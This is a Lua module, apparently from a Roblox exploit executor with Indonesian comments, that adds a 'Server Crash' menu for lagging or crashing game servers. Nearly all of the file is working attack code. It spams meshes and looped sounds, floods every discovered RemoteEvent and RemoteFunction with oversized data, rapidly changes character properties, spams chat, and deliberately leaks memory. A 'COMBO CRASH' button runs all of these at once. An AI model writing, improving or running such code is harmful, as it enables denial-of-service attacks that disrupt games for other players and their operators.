-- features/Crash/serverCrash.lua
-- Modul Server Breaking/Crash - Vanzyxxx Executor
-- Metode paling efektif untuk membuat game lag/crash

return function(UI, Services, Config, Theme)
    local RunService = Services.RunService
    local Workspace = Services.Workspace
    local Players = Services.Players
    local LocalPlayer = Players.LocalPlayer
    local HttpService = Services.HttpService
    local MarketplaceService = Services.MarketplaceService
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Tab untuk fitur crash
    local CrashTab = UI:Tab("Server Crash")
    
    -- Variabel global untuk kontrol
    local ActiveCrashMethods = {}
    local CrashThreads = {}
    local MeshAssets = {}
    local SoundAssets = {}
    
    -- Preload assets untuk crash
    local function PreloadAssets()
        -- Mesh assets (bisa diganti dengan ID mesh lain)
        MeshAssets = {
            123456789, 987654321, 555555555, 666666666, 777777777,
            888888888, 999999999, 111111111, 222222222, 333333333
        }
        
        -- Sound assets (sound ID besar)
        SoundAssets = {
            1234567890, 2345678901, 3456789012, 4567890123, 5678901234,
            6789012345, 7890123456, 8901234567, 9012345678, 1122334455
        }
        
        -- Coba load dari library jika ada
        if isfile and readfile then
            local success, meshData = pcall(function()
                if isfile("mesh_list.txt") then
                    local data = readfile("mesh_list.txt")
                    local meshes = HttpService:JSONDecode(data)
                    if type(meshes) == "table" then
                        for _, id in ipairs(meshes) do
                            table.insert(MeshAssets, tonumber(id) or 0)
                        end
                    end
                end
            end)
        end
    end
    
    -- METODE 1: MESH SPAMMER
    local function StartMeshSpammer(count, interval)
        if ActiveCrashMethods["mesh"] then return end
        
        ActiveCrashMethods["mesh"] = true
        local thread = coroutine.create(function()
            local spawnedCount = 0
            
            while ActiveCrashMethods["mesh"] and spawnedCount < count do
                pcall(function()
                    for _, meshId in ipairs(MeshAssets) do
                        if not ActiveCrashMethods["mesh"] then break end
                        
                        -- Buat part
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(10, 10, 10)
                        part.Anchored = true
                        part.CanCollide = false
                        part.Transparency = 0.5
                        part.Position = Vector3.new(
                            math.random(-500, 500),
                            math.random(10, 100),
                            math.random(-500, 500)
                        )
                        part.Parent = Workspace
                        
                        -- Tambahkan mesh
                        local mesh = Instance.new("SpecialMesh")
                        mesh.MeshId = "rbxassetid://" .. tostring(meshId)
                        mesh.TextureId = "rbxassetid://" .. tostring(meshId)
                        mesh.Scale = Vector3.new(5, 5, 5)
                        mesh.Parent = part
                        
                        spawnedCount = spawnedCount + 1
                        
                        -- Delay untuk mencegah instant crash client sendiri
                        if interval > 0 then
                            task.wait(interval)
                        end
                        
                        if spawnedCount >= count then break end
                    end
                end)
                
                task.wait(0.01)
            end
        end)
        
        table.insert(CrashThreads, thread)
        coroutine.resume(thread)
    end
    
    local function StopMeshSpammer()
        ActiveCrashMethods["mesh"] = false
        
        -- Bersihkan mesh yang sudah dibuat
        spawn(function()
            for _, obj in ipairs(Workspace:GetChildren()) do
                if obj:IsA("Part") and obj:FindFirstChild("SpecialMesh") then
                    pcall(function() obj:Destroy() end)
                end
            end
        end)
    end
    
    -- METODE 2: SOUND FILE SPAMMER
    local function StartSoundSpammer(count, volume)
        if ActiveCrashMethods["sound"] then return end
        
        ActiveCrashMethods["sound"] = true
        local thread = coroutine.create(function()
            local sounds = {}
            local spawned = 0
            
            while ActiveCrashMethods["sound"] and spawned < count do
                pcall(function()
                    for _, soundId in ipairs(SoundAssets) do
                        if not ActiveCrashMethods["sound"] then break end
                        
                        -- Buat sound di berbagai lokasi
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(1, 1, 1)
                        part.Anchored = true
                        part.CanCollide = false
                        part.Transparency = 1
                        part.Position = LocalPlayer.Character and 
                            LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and
                            LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(
                                math.random(-50, 50),
                                math.random(0, 10),
                                math.random(-50, 50)
                            ) or Vector3.new(0, 0, 0)
                        part.Parent = Workspace
                        
                        local sound = Instance.new("Sound")
                        sound.SoundId = "rbxassetid://" .. tostring(soundId)
                        sound.Volume = volume or 10
                        sound.Looped = true
                        sound.Playing = true
                        sound.MaxDistance = 500
                        sound.Parent = part
                        
                        table.insert(sounds, {part = part, sound = sound})
                        spawned = spawned + 1
                        
                        task.wait(0.05)
                        
                        if spawned >= count then break end
                    end
                end)
            end
            
            -- Simpan sounds untuk nanti di-stop
            if ActiveCrashMethods["sound"] then
                while ActiveCrashMethods["sound"] do
                    task.wait(1)
                    -- Keep sounds playing
                    for _, snd in ipairs(sounds) do
                        if snd.sound and snd.sound.Playing == false then
                            snd.sound.Playing = true
                        end
                    end
                end
            end
            
            -- Cleanup
            for _, snd in ipairs(sounds) do
                pcall(function()
                    snd.sound:Stop()
                    snd.part:Destroy()
                end)
            end
        end)
        
        table.insert(CrashThreads, thread)
        coroutine.resume(thread)
    end
    
    local function StopSoundSpammer()
        ActiveCrashMethods["sound"] = false
    end
    
    -- METODE 3: INFINITE LOOP EVENTS
    local function StartEventSpammer(eventName, maxRate)
        if ActiveCrashMethods["events"] then return end
        
        ActiveCrashMethods["events"] = true
        
        -- Cari semua remote events/functions
        local remotes = {}
        
        local function FindRemotes(parent)
            for _, obj in ipairs(parent:GetChildren()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    table.insert(remotes, obj)
                end
                FindRemotes(obj)
            end
        end
        
        FindRemotes(ReplicatedStorage)
        FindRemotes(Workspace)
        
        local thread = coroutine.create(function()
            local spamCount = 0
            local dataTable = {
                "CRASH", "LAG", "SPAM", "A"..string.rep("A", 1000),
                999999999, true, false, nil, {}, Vector3.new(999,999,999)
            }
            
            while ActiveCrashMethods["events"] do
                pcall(function()
                    for _, remote in ipairs(remotes) do
                        if not ActiveCrashMethods["events"] then break end
                        
                        if remote:IsA("RemoteEvent") then
                            -- Fire remote event dengan data besar
                            for i = 1, 10 do
                                remote:FireServer(
                                    dataTable,
                                    string.rep("SPAM", 100),
                                    math.huge,
                                    {nested = {table = {with = {many = {layers = {}}}}} }
                                )
                            end
                        elseif remote:IsA("RemoteFunction") then
                            -- Invoke remote function
                            pcall(function()
                                remote:InvokeServer(
                                    dataTable,
                                    string.rep("INVOKE", 100),
                                    -math.huge
                                )
                            end)
                        end
                        
                        spamCount = spamCount + 1
                        
                        -- Rate limiting jika diperlukan
                        if maxRate and maxRate > 0 then
                            task.wait(1/maxRate)
                        end
                    end
                end)
                
                task.wait(0.001)
            end
        end)
        
        table.insert(CrashThreads, thread)
        coroutine.resume(thread)
    end
    
    local function StopEventSpammer()
        ActiveCrashMethods["events"] = false
    end
    
    -- METODE 4: NETWORK PACKET FLOOD
    local function StartNetworkFlood(packetSize, frequency)
        if ActiveCrashMethods["network"] then return end
        
        ActiveCrashMethods["network"] = true
        
        local thread = coroutine.create(function()
            -- Gunakan berbagai metode network flooding
            while ActiveCrashMethods["network"] do
                pcall(function()
                    -- Method 1: Character property spam
                    if LocalPlayer.Character then
                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                        local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        
                        if humanoid then
                            -- Ubah properti dengan cepat
                            for i = 1, 50 do
                                humanoid.WalkSpeed = math.random(16, 100)
                                humanoid.JumpPower = math.random(50, 200)
                                humanoid.HipHeight = math.random(-5, 5)
                                humanoid.MaxHealth = math.random(100, 10000)
                                
                                if root then
                                    root.CFrame = root.CFrame * CFrame.new(
                                        math.random(-10, 10),
                                        math.random(-10, 10),
                                        math.random(-10, 10)
                                    )
                                    
                                    -- Velocity spam
                                    root.Velocity = Vector3.new(
                                        math.random(-1000, 1000),
                                        math.random(-1000, 1000),
                                        math.random(-1000, 1000)
                                    )
                                end
                            end
                        end
                    end
                    
                    -- Method 2: Tool spam (jika ada tool)
                    local backpack = LocalPlayer:FindFirstChild("Backpack")
                    if backpack then
                        for i = 1, 20 do
                            local tool = Instance.new("Tool")
                            tool.Name = "FLOOD_TOOL_" .. tick()
                            tool.Parent = backpack
                            task.wait(0.001)
                            pcall(function() tool:Destroy() end)
                        end
                    end
                    
                    -- Method 3: Chat spam
                    for i = 1, 10 do
                        pcall(function()
                            game:GetService("TextChatService"):SendAsync(
                                string.rep("PACKET_FLOOD ", 100) .. tick()
                            )
                        end)
                    end
                end)
                
                -- Frequency control
                if frequency and frequency > 0 then
                    task.wait(1/frequency)
                else
                    task.wait(0.001)
                end
            end
        end)
        
        table.insert(CrashThreads, thread)
        coroutine.resume(thread)
    end
    
    local function StopNetworkFlood()
        ActiveCrashMethods["network"] = false
        
        -- Reset character properties
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16
                humanoid.JumpPower = 50
            end
        end
    end
    
    -- METODE 5: MEMORY LEAK GENERATOR
    local function StartMemoryLeak(leakRate)
        if ActiveCrashMethods["memory"] then return end
        
        ActiveCrashMethods["memory"] = true
        local leakedObjects = {}
        
        local thread = coroutine.create(function()
            local leakCount = 0
            
            while ActiveCrashMethods["memory"] do
                pcall(function()
                    -- Buat objects dengan circular references
                    local leakTable = {}
                    leakTable.self = leakTable
                    leakTable.data = string.rep("MEMORY_LEAK_", 1000)
                    leakTable.nested = {}
                    
                    for i = 1, 100 do
                        leakTable.nested[i] = {
                            data = string.rep("LEAK", 500),
                            ref = leakTable,
                            timestamp = tick()
                        }
                    end
                    
                    -- Simpan di global table (tidak akan di-GC)
                    table.insert(leakedObjects, leakTable)
                    
                    -- Buat Instances juga
                    for i = 1, 10 do
                        local frame = Instance.new("Frame")
                        frame.Name = "LEAK_" .. tick() .. "_" .. i
                        
                        -- Tambahkan banyak properti
                        for prop = 1, 50 do
                            pcall(function()
                                frame:SetAttribute("LEAK_ATTR_" .. prop, string.rep("X", 100))
                            end)
                        end
                        
                        -- Simpan reference
                        table.insert(leakedObjects, frame)
                    end
                    
                    leakCount = leakCount + 1
                    
                    -- Tambahkan event connections yang tidak di-disconnect
                    local conn = RunService.Heartbeat:Connect(function()
                        -- Connection yang tidak melakukan apa-apa tapi tetap ada
                        local waste = tick() * math.random()
                    end)
                    table.insert(leakedObjects, conn)
                end)
                
                -- Rate control
                if leakRate and leakRate > 0 then
                    task.wait(1/leakRate)
                else
                    task.wait(0.1)
                end
            end
        end)
        
        table.insert(CrashThreads, thread)
        coroutine.resume(thread)
    end
    
    local function StopMemoryLeak()
        ActiveCrashMethods["memory"] = false
        
        -- Catatan: Objects yang sudah di-leak tidak bisa di-cleanup dengan mudah
        -- Tapi kita bisa coba clear table
        for i = #leakedObjects, 1, -1 do
            local obj = leakedObjects[i]
            if typeof(obj) == "RBXScriptConnection" then
                pcall(function() obj:Disconnect() end)
            elseif typeof(obj) == "Instance" then
                pcall(function() obj:Destroy() end)
            end
            leakedObjects[i] = nil
        end
        
        -- Force garbage collection (jika tersedia)
        pcall(function() game:GetService("GarbageCollection"):Run() end)
        pcall(function() collectgarbage("collect") end)
    end
    
    -- METODE 6: COMBO CRASH (Semua metode sekaligus)
    local function StartComboCrash()
        UI:Confirm("Start COMBO CRASH (Server MIGHT DIE)?", function()
            -- Start semua metode
            StartMeshSpammer(999999, 0.001)
            task.wait(0.5)
            StartSoundSpammer(100, 10)
            task.wait(0.5)
            StartEventSpammer(nil, 1000)
            task.wait(0.5)
            StartNetworkFlood(nil, 1000)
            task.wait(0.5)
            StartMemoryLeak(100)
            
            Services.StarterGui:SetCore("SendNotification", {
                Title = "💀 COMBO CRASH ACTIVE",
                Text = "Server will likely crash soon",
                Duration = 10
            })
        end)
    end
    
    local function StopAllCrash()
        for method, _ in pairs(ActiveCrashMethods) do
            if method == "mesh" then StopMeshSpammer()
            elseif method == "sound" then StopSoundSpammer()
            elseif method == "events" then StopEventSpammer()
            elseif method == "network" then StopNetworkFlood()
            elseif method == "memory" then StopMemoryLeak() end
        end
        
        -- Stop semua threads
        for _, thread in ipairs(CrashThreads) do
            pcall(function() coroutine.close(thread) end)
        end
        CrashThreads = {}
        
        Services.StarterGui:SetCore("SendNotification", {
            Title = "Crash Stopped",
            Text = "All crash methods disabled",
            Duration = 3
        })
    end
    
    -- UI ELEMENTS
    CrashTab:Label("╔═══════════════════════════╗")
    CrashTab:Label("      SERVER BREAKING")
    CrashTab:Label("╚═══════════════════════════╝")
    
    -- Preload assets button
    CrashTab:Button("🔧 Preload Crash Assets", Theme.ButtonDark, function()
        PreloadAssets()
        Services.StarterGui:SetCore("SendNotification", {
            Title = "Assets Loaded",
            Text = "Ready for crashing",
            Duration = 3
        })
    end)
    
    CrashTab:Label("")
    CrashTab:Label("─ INDIVIDUAL METHODS ─")
    
    -- Mesh Spammer
    local meshToggle = CrashTab:Toggle("🧱 Mesh Spammer (500 meshes)", function(state)
        if state then
            StartMeshSpammer(500, 0.01)
        else
            StopMeshSpammer()
        end
    end)
    
    -- Sound Spammer
    local soundToggle = CrashTab:Toggle("🔊 Sound Spammer (50 sounds)", function(state)
        if state then
            StartSoundSpammer(50, 5)
        else
            StopSoundSpammer()
        end
    end)
    
    -- Event Spammer
    local eventToggle = CrashTab:Toggle("🔄 Event Loop Spammer", function(state)
        if state then
            StartEventSpammer(nil, 100)
        else
            StopEventSpammer()
        end
    end)
    
    -- Network Flood
    local networkToggle = CrashTab:Toggle("📡 Network Packet Flood", function(state)
        if state then
            StartNetworkFlood(nil, 500)
        else
            StopNetworkFlood()
        end
    end)
    
    -- Memory Leak
    local memoryToggle = CrashTab:Toggle("💾 Memory Leak Generator", function(state)
        if state then
            StartMemoryLeak(10)
        else
            StopMemoryLeak()
        end
    end)
    
    CrashTab:Label("")
    CrashTab:Label("─ NUKES ─")
    
    -- Combo Crash Button
    CrashTab:Button("💣 COMBO CRASH (ALL METHODS)", Color3.fromRGB(255, 50, 50), function()
        StartComboCrash()
    end)
    
    -- Emergency Stop
    CrashTab:Button("🛑 EMERGENCY STOP ALL", Color3.fromRGB(50, 255, 50), function()
        StopAllCrash()
    end)
    
    CrashTab:Label("")
    CrashTab:Label("─ SETTINGS ─")
    
    -- Custom Mesh IDs input
    CrashTab:Input("Enter Mesh IDs (comma separated)", function(text)
        if text and text ~= "" then
            MeshAssets = {}
            for id in text:gmatch("([^,]+)") do
                local numId = tonumber(id:match("%d+"))
                if numId then
                    table.insert(MeshAssets, numId)
                end
            end
            Services.StarterGui:SetCore("SendNotification", {
                Title = "Mesh IDs Updated",
                Text = #MeshAssets .. " meshes loaded",
                Duration = 3
            })
        end
    end)
    
    -- Custom Sound IDs input
    CrashTab:Input("Enter Sound IDs (comma separated)", function(text)
        if text and text ~= "" then
            SoundAssets = {}
            for id in text:gmatch("([^,]+)") do
                local numId = tonumber(id:match("%d+"))
                if numId then
                    table.insert(SoundAssets, numId)
                end
            end
            Services.StarterGui:SetCore("SendNotification", {
                Title = "Sound IDs Updated",
                Text = #SoundAssets .. " sounds loaded",
                Duration = 3
            })
        end
    end)
    
    -- Intensitas Slider
    CrashTab:Slider("Crash Intensity", 1, 10, function(value)
        -- Adjust semua parameter berdasarkan intensity
        local intensity = value
        
        -- Update mesh spam
        if meshToggle and meshToggle.GetState and meshToggle.GetState() then
            StopMeshSpammer()
            StartMeshSpammer(100 * intensity, math.max(0.01, 0.1 / intensity))
        end
        
        -- Update sound spam
        if soundToggle and soundToggle.GetState and soundToggle.GetState() then
            StopSoundSpammer()
            StartSoundSpammer(20 * intensity, intensity * 2)
        end
    end)
    
    -- Info label
    CrashTab:Label("")
    CrashTab:Label("⚠️ WARNING: May get you")
    CrashTab:Label("   kicked/banned")
    
    -- Auto cleanup on script reset
    Config.OnReset:Connect(function()
        StopAllCrash()
    end)
    
    -- Initial asset preload
    spawn(function()
        task.wait(2)
        PreloadAssets()
    end)
    
    -- Return functions jika diperlukan
    return {
        StartMeshSpammer = StartMeshSpammer,
        StopMeshSpammer = StopMeshSpammer,
        StartSoundSpammer = StartSoundSpammer,
        StopSoundSpammer = StopSoundSpammer,
        StartEventSpammer = StartEventSpammer,
        StopEventSpammer = StopEventSpammer,
        StartNetworkFlood = StartNetworkFlood,
        StopNetworkFlood = StopNetworkFlood,
        StartMemoryLeak = StartMemoryLeak,
        StopMemoryLeak = StopMemoryLeak,
        StartComboCrash = StartComboCrash,
        StopAllCrash = StopAllCrash
    }
end